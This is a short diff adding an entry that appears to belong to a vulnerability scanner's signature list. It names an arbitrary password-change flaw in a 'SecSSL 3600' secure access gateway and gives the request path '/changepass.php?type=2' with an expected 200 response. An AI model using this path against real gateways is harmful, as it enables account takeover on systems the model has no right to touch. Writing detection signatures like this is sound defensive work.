@@ -1,0 +1,3 @@
+name: "某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞"
+poc: "/changepass.php?type=2"
+status_code: 200
